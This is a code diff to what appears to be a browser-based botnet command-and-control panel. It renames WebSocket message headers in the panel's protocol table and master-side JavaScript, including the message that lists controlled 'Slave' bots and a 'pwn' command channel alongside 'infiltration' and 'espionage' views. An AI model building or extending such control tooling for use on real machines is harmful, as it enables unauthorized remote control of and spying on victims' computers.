@@ -568,9 +568,8 @@
   a. Slave - bots
   b. Master - remote control
 
-client_list - list of clients
-client_identification - identification of client
-client_status - client status
+clients - list of clients
+client - client details
 data - data from the slaves (sent to master)
 pwn - command from the master (sent to slaves)
 pipe - pipe data to other clients
@@ -579,9 +578,9 @@ config - set slave configuration
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  Slave                      | Server                      | Master
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-                            | client_list-rxtx            | rxtx-client_list
- client_identification-tx   | rx-client_identification    | tx-client_identification
-                            | client_status-tx            | rx-client_status
+                            | clients-rxtx                | rxtx-clients
+ client-tx                  | rx-client                   | tx-client
+                            | client-tx                   | rx-client
  data-tx                    | rxtx-data-rxtx              | rxtx-data
  pwn-rx                     | rxtx-pwn-rxtx               | rxtx-pwn
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -675,7 +674,7 @@ config - set slave configuration
 */
 server = "ws://" + window.document.location.host + "/";
 identification = {
- "header":"client_identification",
+ "header":"client",
  "payload":{
     "id":"1",
     "type":"Master",
@@ -722,7 +721,7 @@ if ("WebSocket" in window) {
       console_(trailer);
       console.log(trailer);
 
-      if(header == "client_list"){ //DEATHNOTE
+      if(header == "clients"){ //DEATHNOTE
         clients = payload;
         $.each(clients, function(i, client) {
           if(client.type == "Slave")
@@ -910,7 +909,7 @@ $("#box-documentation").hide();
 $("#box-about").hide();
 
 $("#nav-clients").click(function(){
-  ws.send('{"header": "client_list"}');
+  ws.send('{"header": "clients"}');
   $("#box-clients").show();
   $("#box-infiltration").hide();
   $("#box-espionage").hide();
